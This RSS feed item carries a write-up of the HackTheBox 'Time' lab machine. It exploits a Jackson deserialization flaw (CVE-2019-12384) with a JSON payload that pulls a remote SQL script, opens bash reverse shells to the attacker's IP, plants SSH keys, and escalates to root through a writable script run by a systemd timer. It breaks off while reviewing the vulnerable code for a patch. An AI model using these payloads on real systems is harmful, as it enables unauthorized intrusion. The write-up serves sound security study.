<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Code-review on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/code-review/</link>
    <description>Recent content in Code-review on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 09 May 2021 05:43:58 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/code-review/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
      <description>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&amp;rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds.</description>
      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Deserialization Attack</li>
<li>Mitigation CVE-2019-12384</li>
<li>Exploiting Systemd timers</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.214
Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[ 
<span style="color:#e6db74">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span>,
{ <span style="color:#f92672">&#34;make&#34;</span>: <span style="color:#e6db74">&#34;Isuzu&#34;</span>, <span style="color:#f92672">&#34;model&#34;</span>: <span style="color:#e6db74">&#34;NQR&#34;</span>,<span style="color:#f92672">&#34;payloadCapacity&#34;</span>: <span style="color:#ae81ff">7500.0</span> }
]
</code></pre></div><p>And now it returns a different error message.</p>
<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span>}]
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>id <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span>}]
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>bash <span style="color:#f92672">-</span>i <span style="color:#f92672">&gt;&amp;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000 0<span style="color:#f92672">&gt;&amp;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<pre><code>→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9000            
listening on [any] 9000 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span style="color:#ae81ff">235</span>
  Users logged in:         <span style="color:#ae81ff">0</span>
  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.214
  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span style="color:#ae81ff">23</span> 09:19:19 <span style="color:#ae81ff">2020</span> from 10.10.14.5
pericles@time:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching a files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null |grep -v <span style="color:#e6db74">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span style="color:#ae81ff">1</span> pericles pericles <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -name <span style="color:#e6db74">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span style="color:#ae81ff">795750</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">214</span> Oct <span style="color:#ae81ff">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span style="color:#ae81ff">787186</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">159</span> Oct <span style="color:#ae81ff">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span style="color:#ae81ff">1317302</span>      <span style="color:#ae81ff">4</span> -rwxrw-rw-   <span style="color:#ae81ff">1</span> pericles pericles       <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span style="color:#75715e">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;&amp; /dev/tcp/10.10.14.72/9002 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.10.214] 57648
bash: cannot set terminal process group (411032): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# 
root@time:/# exit
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9002                          
listening on [any] 9002 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 34182
bash: cannot set terminal process group (65312): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/#  echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK&#39; &gt; /root/.ssh/authorized_keys
root@time:/# exit
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  9 14:41:33 2021
root@time:~# id
uid=0(root) gid=0(root) groups=0(root)
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>])){
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;mode&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;mode&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>){
                $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#e6db74">&#34;/dev/shm&#34;</span>, <span style="color:#e6db74">&#34;payload&#34;</span>);
                $myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Unable to open file!&#34;</span>);
                $txt <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>]; <span style="color:#75715e">// Condition #1,  $txt controlled by user. no filter
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">fwrite</span>($myfile, $txt); 
                <span style="color:#a6e22e">fclose</span>($myfile);
                <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span style="color:#e6db74">$filename</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>, $cmdout, $ret);
                <span style="color:#a6e22e">unlink</span>($filename);
                <span style="color:#66d9ef">if</span>($ret <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>){
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span>;
                }
                <span style="color:#66d9ef">else</span>{
                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span style="color:#f92672">.</span> $cmdout[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
                }
        }
        <span style="color:#66d9ef">else</span>{
                $json_ugly <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>];
                $json_pretty <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#a6e22e">json_decode</span>($json_ugly), <span style="color:#a6e22e">JSON_PRETTY_PRINT</span>);
                $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">.</span>$json_pretty<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
        }

}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>enableDefaultTyping() <span style="color:#75715e"># Condition #2, the uses of &#34;default typing&#34;.</span>
